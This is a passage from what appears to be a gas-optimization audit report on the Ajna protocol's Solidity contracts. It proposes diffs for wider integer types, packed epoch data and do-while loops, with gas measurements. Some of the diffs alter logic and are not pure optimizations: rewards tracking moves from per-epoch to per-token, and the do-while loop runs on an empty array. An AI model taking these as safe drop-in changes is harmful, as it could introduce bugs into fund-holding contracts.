class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // need to modify out of scope interface file and tests for this to work.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return uint256(epochInfo[tokenId_][epoch_].rewardsClaimed);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** External Functions ***/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -119,7 +132,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (epochInfo[tokenId_][epochToClaim_].isEpochClaimed) revert AlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _claimRewards(stakeInfo, tokenId_, epochToClaim_, true, stakeInfo.ajnaPool);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -408,8 +421,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++epoch; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // update epoch token claim trackers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            rewardsClaimed[epoch]           += nextEpochRewards;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            isEpochClaimed[tokenId_][epoch] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            epochInfo[tokenId_][epoch].rewardsClaimed += uint248(nextEpochRewards);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            epochInfo[tokenId_][epoch].isEpochClaimed = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -432,7 +445,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal view returns (uint256 epochRewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 nextEpoch = epoch_ + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 claimedRewardsInNextEpoch = rewardsClaimed[nextEpoch];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 claimedRewardsInNextEpoch = uint256(epochInfo[tokenId_][nextEpoch].rewardsClaimed);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 bucketIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 interestEarned;</span></span></span></code></pre>\n<h2 id=\"g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g 08 usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</h2>\n<p>The EVM operates with 32 byte words. Therefore, if you declare state variables less than 32 bytes the EVM will need to perform extra operations to cast your value to the specified size.</p>\n<p>Total Instances: <code>2</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L63\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L63</a></p>\n<p><em>Gas Savings for <code>GrantFund.startNewDistributionPeriod</code>, obtained via protocol’s tests: Avg 218 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>75597</td>\n</tr>\n<tr>\n<td>After</td>\n<td>75379</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"177\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_currentDistributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"178\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..971e285 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -60,7 +60,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @dev Updated at the start of each quarter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @dev Monotonically increases by one per period.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint24 internal _currentDistributionId = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 internal _currentDistributionId = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @notice Mapping of quarterly distributions from the grant fund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -117,8 +117,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function startNewDistributionPeriod() external override returns (uint24 newDistributionId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint24  currentDistributionId       = _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 currentDistributionEndBlock = _distributions[currentDistributionId].endBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256  currentDistributionId       = _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 currentDistributionEndBlock = _distributions[uint24(currentDistributionId)].endBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that there isn&#39;t currently an active distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (block.number &lt;= currentDistributionEndBlock) revert DistributionPeriodStillActive();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -128,13 +128,13 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Check if any last distribution exists and its challenge stage is over</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (currentDistributionId &gt; 0 &amp;&amp; (block.number &gt; _getChallengeStageEndBlock(currentDistributionEndBlock))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // Add unused funds from last distribution to treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _updateTreasury(currentDistributionId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _updateTreasury(uint24(currentDistributionId));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // checks if any second last distribution exist and its unused funds are not added into treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (currentDistributionId &gt; 1 &amp;&amp; !_isSurplusFundsUpdated[currentDistributionId - 1]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // Add unused funds from second last distribution to treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _updateTreasury(currentDistributionId - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _updateTreasury(uint24(currentDistributionId) - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -225,7 +225,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @return newId_ The new distribution period Id.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _setNewDistributionId() private returns (uint24 newId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        newId_ = _currentDistributionId += 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        newId_ = uint24(_currentDistributionId += 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /************************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -376,7 +376,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check for duplicate proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (newProposal.proposalId != 0) revert ProposalAlreadyExists();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution memory currentDistribution = _distributions[uint24(_currentDistributionId)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // cannot add new proposal after end of screening period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // screening period ends 72000 blocks before end of distribution period, ~ 80 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -519,9 +519,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function fundingVote(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         FundingVoteParams[] memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 votesCast_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint24 currentDistributionId = _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 currentDistributionId = _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution storage currentDistribution = _distributions[currentDistributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution storage currentDistribution = _distributions[uint24(currentDistributionId)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuadraticVoter        storage voter               = _quadraticVoters[currentDistributionId][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 endBlock = currentDistribution.endBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -572,7 +572,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function screeningVote(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ScreeningVoteParams[] memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 votesCast_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        QuarterlyDistribution memory currentDistribution = _distributions[uint24(_currentDistributionId)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check screening stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (block.number &lt; currentDistribution.startBlock || block.number &gt; _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -926,7 +926,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function getDistributionId() external view override returns (uint24) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return uint24(_currentDistributionId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L62\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L62</a></p>\n<p><em>Gas Savings for <code>PositionManager.mint</code>, obtained via protocol’s tests: Avg 256 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>98876</td>\n</tr>\n<tr>\n<td>After</td>\n<td>98620</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"179\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint176</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nextId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"180\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..7e186a2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -59,7 +59,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(uint256 =&gt; EnumerableSet.UintSet)        internal positionIndexes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @dev Id of the next token that will be minted. Skips `0`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint176 private _nextId = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 private _nextId = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /******************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** Immutables ***/</span></span></span></code></pre>\n<h2 id=\"g-09-use-do-while-loops-instead-of-for-loops\" style=\"position:relative;\"><a href=\"#g-09-use-do-while-loops-instead-of-for-loops\" aria-label=\"g 09 use do while loops instead of for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Use <code>do while</code> loops instead of <code>for</code> loops</h2>\n<p>A <code>do while</code> loop will cost less gas since the condition is not being checked for the first iteration.</p>\n<p>Total Instances: <code>14</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L680-L704\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L680-L704</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: Avg 90 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>392974</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"181\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">680</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexes_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">704</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexes_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"182\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..ab3ceb6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -677,8 +677,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update exchange rates only if the pool has not yet burned any tokens without calculating any reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (curBurnEpoch == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 i = 0; i &lt; indexes_.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _updateBucketExchangeRate(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     pool_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     indexes_[i],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -687,7 +687,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            } while(i &lt; indexes_.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -701,8 +701,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (block.timestamp &lt;= curBurnTime + UPDATE_PERIOD) {</span></span></span>\n<span class=\"grvsc-line\"><span 